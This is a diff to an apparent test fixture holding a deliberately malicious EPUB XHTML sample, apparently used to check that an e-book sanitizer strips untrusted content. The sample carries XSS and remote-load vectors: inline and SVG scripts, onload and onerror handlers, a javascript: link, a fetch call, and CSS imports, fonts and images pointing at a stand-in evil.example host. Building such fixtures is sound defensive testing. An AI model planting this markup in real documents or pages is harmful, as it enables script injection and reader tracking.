@@ -9,12 +9,23 @@ export const MALICIOUS_EPUB_XHTML = `
   <head>
     <title>不可信 EPUB</title>
     <link rel="stylesheet" href="https://evil.example/remote.css" />
+    <style>
+      @import "https://evil.example/import.css";
+      @font-face { font-family: remote; src: url("https://evil.example/remote.woff") }
+      body { background-image: url("https://evil.example/remote.png") }
+    </style>
   </head>
   <body onload="fetch('https://evil.example/boot')">
     <script>window.__bookPayload = 'executed';</script>
     <iframe src="https://evil.example/frame"></iframe>
     <object data="https://evil.example/object"></object>
     <embed src="https://evil.example/embed" />
+    <audio controls src="media/audio.mp3"><source src="media/audio.mp3" /><track src="media/captions.vtt" /></audio>
+    <video controls src="media/video.mp4" poster="media/poster.png"></video>
+    <svg xmlns="http://www.w3.org/2000/svg" onload="alert('svg')">
+      <script>alert('svg-script')</script>
+      <image href="https://evil.example/svg.png" />
+    </svg>
     <a href="javascript:alert('xss')">危险链接</a>
     <img src="https://evil.example/remote.png" />
     <img src="//evil.example/tracker.png" onerror="alert('xss')" />
